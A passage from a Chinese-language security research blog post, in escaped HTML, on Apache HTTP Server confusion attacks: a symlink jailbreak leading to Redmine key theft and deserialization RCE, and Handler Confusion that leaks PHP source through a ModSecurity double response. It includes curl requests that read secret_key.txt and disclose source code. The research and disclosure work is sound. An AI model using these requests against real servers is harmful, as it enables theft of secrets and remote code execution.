  &lt;li&gt;&lt;strong&gt;Cacti Log&lt;/strong&gt;: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/usr/share/cacti/site/&lt;/code&gt;  -&amp;gt;  &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/var/log/cacti/&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Solr Data&lt;/strong&gt;: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/usr/share/solr/data/&lt;/code&gt;  -&amp;gt;  &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/var/lib/solr/data&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Solr Config&lt;/strong&gt;: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/usr/share/solr/conf/&lt;/code&gt;  -&amp;gt;  &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/solr/conf/&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;MediaWiki Config&lt;/strong&gt;: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/usr/share/mediawiki/config/&lt;/code&gt;  -&amp;gt;  &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/var/lib/mediawiki/config/&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;SimpleSAMLphp Config&lt;/strong&gt;: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/usr/share/simplesamlphp/config/&lt;/code&gt;  -&amp;gt;  &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/simplesamlphp/&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h5 id=&quot;️-2-3-2-jailbreak-local-gadgets-to-redmine-rce&quot;&gt;✔️ 2-3-2. Jailbreak Local Gadgets to Redmine RCE&lt;/h5&gt;

&lt;p&gt;越獄攻擊手法的最後讓我們展示一個利用 Redmine 的雙層符號連結跳躍去完成 RCE 的例子。 在預設安裝的 Redmine 程式碼目錄中有個 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;instances/&lt;/code&gt; 目錄指向 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/var/lib/redmine/&lt;/code&gt;，而位於 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/var/lib/redmine/&lt;/code&gt; 下的 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;default/config/&lt;/code&gt; 目錄又指向 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/redmine/default/&lt;/code&gt; 資料夾，裡面存放著 Redmine 的資料庫設定以及應用程式私密金鑰。&lt;/p&gt;

&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;file /usr/share/redmine/instances/
 symbolic &lt;span class=&quot;nb&quot;&gt;link &lt;/span&gt;to /var/lib/redmine/
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;file /var/lib/redmine/config/
 symbolic &lt;span class=&quot;nb&quot;&gt;link &lt;/span&gt;to /etc/redmine/default/
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; /etc/redmine/default/
 database.yml    secret_key.txt
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;於是透過一個不安全的 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RewriteRule&lt;/code&gt; 以及兩層符號連結，我們能夠輕鬆存取到 Redmine 所使用的應用程式金鑰：&lt;/p&gt;

&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;curl http://server/html/usr/share/redmine/instances/default/config/secret_key.txt%3f
 HTTP/1.1 200 OK
 Server: Apache/2.4.59 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 
 ...
 6d222c3c3a1881c865428edb79a74405
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;而 Redmine 又是基於 Ruby on Rails 所開發的應用程式，其中 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;secret_key.txt&lt;/code&gt; 的內容其實正是其簽章加密所使用到的金鑰，接下來的流程相信對&lt;a href=&quot;https://drive.google.com/file/d/1UMxphxFxwRf7wbrw4_Hr56KGPzpLU3Ef/view&quot;&gt;熟悉攻擊 RoR 的同學&lt;/a&gt;應該不陌生，透過已知的金鑰將惡意 Marshal 物件簽章加密後嵌入 Cookie，接著透過伺服器端的反序列化最終實現遠端程式碼執行！&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240809/7.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h3 id=&quot;-3-handler-confusion&quot;&gt;🔥 3. Handler Confusion&lt;/h3&gt;

&lt;p&gt;最後一個要介紹的攻擊是 Handler 上的 Confusion。 這個攻擊同樣也利用了一個 Apache HTTP Server 從上古時期架構所遺留下來的技術債。這裡透過一個例子來讓讀者快速的了解這個技術債 —— 如果今天想在 Httpd 上運行經典的 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mod_php&lt;/code&gt;，下面兩個語法設定你覺得哪個才是正確的？&lt;/p&gt;

&lt;div class=&quot;language-apache highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nc&quot;&gt;AddHandler&lt;/span&gt; application/x-httpd-php .php
&lt;span class=&quot;nc&quot;&gt;AddType&lt;/span&gt;    application/x-httpd-php .php
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;答案是 —— 兩個都可以正確地讓 PHP 運行起來！ 這裡分別是兩個設定的語法格式，可以看到兩個設定不僅用法、參數類似，現在連效果都一模一樣，為什麼 Apache HTTP Server 當初要設計兩個不同的語法？&lt;/p&gt;

&lt;div class=&quot;language-config highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;AddHandler&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;handler&lt;/span&gt;-&lt;span class=&quot;n&quot;&gt;name&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;extension&lt;/span&gt; [&lt;span class=&quot;n&quot;&gt;extension&lt;/span&gt;] ...
&lt;span class=&quot;n&quot;&gt;AddType&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;media&lt;/span&gt;-&lt;span class=&quot;n&quot;&gt;type&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;extension&lt;/span&gt; [&lt;span class=&quot;n&quot;&gt;extension&lt;/span&gt;] ...
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;實際上 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;handler-name&lt;/code&gt; 以及 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;media-type&lt;/code&gt; 在 Httpd 的內部結構中代表著不同的欄位，分別對應到 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;r-&amp;gt;handler&lt;/code&gt; 以及 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;r-&amp;gt;content_type&lt;/code&gt;。 而&lt;strong&gt;使用者可以在沒有感知的情況下使用則歸功於一段從 &lt;a href=&quot;https://svn.apache.org/repos/asf/httpd/httpd/branches/1.3.x/src/main/http_config.c&quot;&gt;1996 年&lt;/a&gt; Apache HTTP Server 開發初期就遺留到現在的程式碼&lt;/strong&gt;：&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;&lt;em&gt;Path: &lt;a href=&quot;https://github.com/apache/httpd/blob/2.4.58/server/config.c#L420&quot;&gt;server/config.c#L420&lt;/a&gt;&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;AP_CORE_DECLARE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ap_invoke_handler&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;request_rec&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;

    &lt;span class=&quot;c1&quot;&gt;// [...]&lt;/span&gt;

    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;handler&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;content_type&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;handler&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;content_type&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ap_strchr_c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;handler&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;&apos;;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;new_handler&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;apr_pmemdup&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pool&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;handler&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
                                                        &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;handler&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
                &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;new_handler&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;handler&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;handler&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;new_handler&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

                &lt;span class=&quot;cm&quot;&gt;/* exclude media type arguments */&lt;/span&gt;
                &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;handler&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;&apos; &apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
                    &lt;span class=&quot;o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;cm&quot;&gt;/* strip trailing spaces */&lt;/span&gt;

                &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;sc&quot;&gt;&apos;\0&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;handler&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;AP_DEFAULT_HANDLER_NAME&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

        &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;handler&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;handler&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

    &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ap_run_handler&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;可以看到在進入主要的模組處理器 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ap_run_handler()&lt;/code&gt; 之前，如果請求中的 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;r-&amp;gt;handler&lt;/code&gt; 為空則把結構中 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;r-&amp;gt;content_type&lt;/code&gt; 欄位的內容當成最終將被使用的模組處理器。 這也就是為什麼 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;AddType&lt;/code&gt; 以及 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;AddHandler&lt;/code&gt; 效果一致的主要理由，因為 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;media-type&lt;/code&gt; 最終在執行前還是會被轉換成 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;handler-name&lt;/code&gt;。 我們的第三個 Handler Confusion 主要也就是圍繞在這個行為所發展出來的攻擊。&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h4 id=&quot;️-primitive-3-1-overwrite-the-handler&quot;&gt;⚔️ Primitive 3-1. Overwrite the Handler&lt;/h4&gt;

&lt;p&gt;在理解這個轉換機制後首先第一個攻擊手法是 —— &lt;strong&gt;Overwrite the Handler&lt;/strong&gt;，想像一下如果今天目標的 Apache HTTP Server 透過 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;AddType&lt;/code&gt; 將 PHP 運行起來。&lt;/p&gt;

&lt;div class=&quot;language-apache highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nc&quot;&gt;AddType&lt;/span&gt; application/x-httpd-php  .php
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;在正常的流程中瀏覽 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http://server/config.php&lt;/code&gt;。 首先，&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mod_mime&lt;/code&gt; 會在 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;type_checker&lt;/code&gt; 階段根據 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;AddType&lt;/code&gt; 所設定的附檔名將相對應的內容複製到 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;r-&amp;gt;content_type&lt;/code&gt; 中，由於 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;r-&amp;gt;handler&lt;/code&gt; 在整個 HTTP 生命週期中並無賦值，於是在執行模組處理器前 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ap_invoke_handler()&lt;/code&gt; 會將 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;r-&amp;gt;content_type&lt;/code&gt; 當成模組處理器，最終呼叫 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mod_php&lt;/code&gt; 處理請求。&lt;/p&gt;

&lt;p&gt;然而如果今天有任何模組在執行到 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ap_invoke_handler()&lt;/code&gt; 前「不小心」把 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;r-&amp;gt;content_type&lt;/code&gt; 覆寫掉了，那會發生什麼事呢？&lt;/p&gt;

&lt;h5 id=&quot;️-3-1-1-overwrite-handler-to-disclose-php-source-code&quot;&gt;✔️ 3-1-1. Overwrite Handler to Disclose PHP Source Code&lt;/h5&gt;

&lt;p&gt;因此這個攻擊手法的第一個利用就是透過這個「不小心」去洩漏任意 PHP 的原始碼。 這個技術最早是由 Max Dmitriev 在 ZeroNights 2021 所發表的研究中提及 (kudos to him!)，演講主題及投影片可以從這邊看到：&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;&lt;a href=&quot;https://web.archive.org/web/20210909012535/https://zeronights.ru/wp-content/uploads/2021/09/013_dmitriev-maksim.pdf&quot;&gt;Apache 0day bug, which still nobody knows of, and which was fixed accidentally&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Max Dmitriev 觀察到只要送出錯誤的 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Content-Length&lt;/code&gt;，遠端 Httpd 伺服器會發生不明的錯誤順帶回傳 PHP 的原始碼，在細追流程後發現其成因是 ModSecurity 在使用 APR (Apache Portable Runtime) 函示庫時並未好好的處理 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;AP_FILTER_ERROR&lt;/code&gt; 回傳值所導致的 &lt;a href=&quot;https://github.com/owasp-modsecurity/ModSecurity/issues/2514&quot;&gt;double response&lt;/a&gt;。 由於發生錯誤時 Httpd 想送出一些 HTML 錯誤訊息，於是 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;r-&amp;gt;content_type&lt;/code&gt; 也順便被覆寫成 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;text/html&lt;/code&gt;。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240809/8.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;由於 ModSecurity 並未妥善的處理回傳值使得本該停止的 Httpd 內部流程繼續執行，而這個「副作用」又會把原本加上的 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Content-Type&lt;/code&gt; 給覆寫掉，導致最終該被當成 PHP 的檔案被當成一般文件處理並將其中的程式碼及敏感設定印出。 🤫&lt;/p&gt;

&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;curl &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; http://127.0.0.1/info.php &lt;span class=&quot;nt&quot;&gt;-H&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Content-Length: x&quot;&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; HTTP/1.1 400 Bad Request
&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; Date: Mon, 29 Jul 2024 05:32:23 GMT
&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; Server: Apache/2.4.41 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; Content-Type: text/html&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;charset&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;iso-8859-1

&amp;lt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;DOCTYPE HTML PUBLIC &lt;span class=&quot;s2&quot;&gt;&quot;-//IETF//DTD HTML 2.0//EN&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
&amp;lt;html&amp;gt;&amp;lt;&lt;span class=&quot;nb&quot;&gt;head&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
&amp;lt;title&amp;gt;400 Bad Request&amp;lt;/title&amp;gt;
...
&amp;lt;?php phpinfo&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;理論上所有基於 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Content-Type&lt;/code&gt; 的設定語法都容易遭受此類問題影響，所以除了 Max 在投影片中所展示的 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;php-cgi&lt;/code&gt; 搭配 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mod_actions&lt;/code&gt; 外，純粹的 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mod_php&lt;/code&gt; 搭配上 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;AddType&lt;/code&gt; 也同樣也受影響。&lt;/p&gt;

&lt;p&gt;另外值得一提的是，這個副作用在 Apache HTTP Server 版本 2.4.44 時被當成一個&lt;a href=&quot;https://github.com/apache/httpd/commit/3303dc4f7273e05ea9a80402b33f68cd155c146a&quot;&gt;增進請求解析器&lt;/a&gt;的程式錯誤被更正，於是這個「漏洞」就被當成已修復直到我重新撿起它。 但由於其根本成因還是 ModSecurity 並未好好的處理錯誤，只要找到其它條觸發 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;AP_FILTER_ERROR&lt;/code&gt; 的路徑那同樣的行為還是可以重現成功。&lt;/p&gt;

&lt;p&gt;&lt;em&gt;P.S. 此問題已於 6/20 透過官方信箱回報給 ModSecurity 並由 Project Co-Leader 建議回到原 &lt;a href=&quot;https://github.com/owasp-modsecurity/ModSecurity/issues/2514&quot;&gt;GitHub Issue&lt;/a&gt; 中討論。&lt;/em&gt;&lt;/p&gt;

&lt;h5 id=&quot;️-3-1-2-overwrite-handler-to---&quot;&gt;✔️ 3-1-2. Overwrite Handler to ██████ ███████ ██████&lt;/h5&gt;

&lt;p&gt;基於前面提到的 &lt;a href=&quot;https://github.com/owasp-modsecurity/ModSecurity/issues/2514&quot;&gt;double response&lt;/a&gt; 行為以及副作用，這個攻擊手法還可以完成其它更酷的利用，不過由於此問題尚未完全修復，更進一步的利用方式，將於修復完成後再揭露。&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h4 id=&quot;️-primitive-3-2-invoke-arbitrary-handlers&quot;&gt;⚔️ Primitive 3-2. Invoke Arbitrary Handlers&lt;/h4&gt;

&lt;p&gt;仔細思考前面 Overwrite Handler 攻擊手法，雖然是因為 ModSecurity 並未好好的處理錯誤，導致請求被設置上錯誤的 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Content-Type&lt;/code&gt;。 但再深入的探究其根本原因應該是 —— &lt;strong&gt;Apache HTTP Server 在使用 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;r-&amp;gt;content_type&lt;/code&gt; 時，其實無從辨別它的語意，這個欄位既可以是在請求階段被語法設定好的值，也可以是回應階段伺服器回傳 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Content-Type&lt;/code&gt; 標頭的內容。&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;所以理論上如果能控制伺服器回應中 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Content-Type&lt;/code&gt; 標頭的內容，那就可以透過那段從開發初期遺留至今的程式碼呼叫任意的模組處理器，這也是 Handler Confusion 的最後一個攻擊手法 —— &lt;strong&gt;呼叫任意 Apache HTTP Server 的內部模組處理器&lt;/strong&gt;！&lt;/p&gt;

&lt;p&gt;但這裡還有最後的一塊拼圖必須填上，在 Httpd 中所有可以從伺服器回應修改到 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;r-&amp;gt;content_type&lt;/code&gt; 的地方全都發生在那段遺留程式碼之後，就算修改到該欄位的內容，此時 HTTP 生命週期也進入尾聲，無法再做更進一步的利用…… 嗎？&lt;/p&gt;

&lt;p&gt;我們找了 &lt;a href=&quot;https://datatracker.ietf.org/doc/html/rfc3875&quot;&gt;RFC 3875&lt;/a&gt; 來當救援投手！ RFC 3875 是一個關於 CGI 的規範，其中 &lt;a href=&quot;https://datatracker.ietf.org/doc/html/rfc3875#section-6.2.2&quot;&gt;6.2.2. 節&lt;/a&gt;定義了一個 Local Redirect Response 行為:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;The CGI script can return a URI path and query-string (‘local-pathquery’) for a local resource in a Location header field. This indicates to the server that it should reprocess the request using the path specified.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;簡單來說規範了 CGI 在特定條件下必須使用伺服器端的資源去處理轉址，仔細檢視 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mod_cgi&lt;/code&gt; 對於這個規範的實作會發現：&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;&lt;em&gt;Path: &lt;a href=&quot;https://github.com/apache/httpd/blob/2.4.58/modules/generators/mod_cgi.c#L983&quot;&gt;modules/generators/mod_cgi.c#L983&lt;/a&gt;&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;

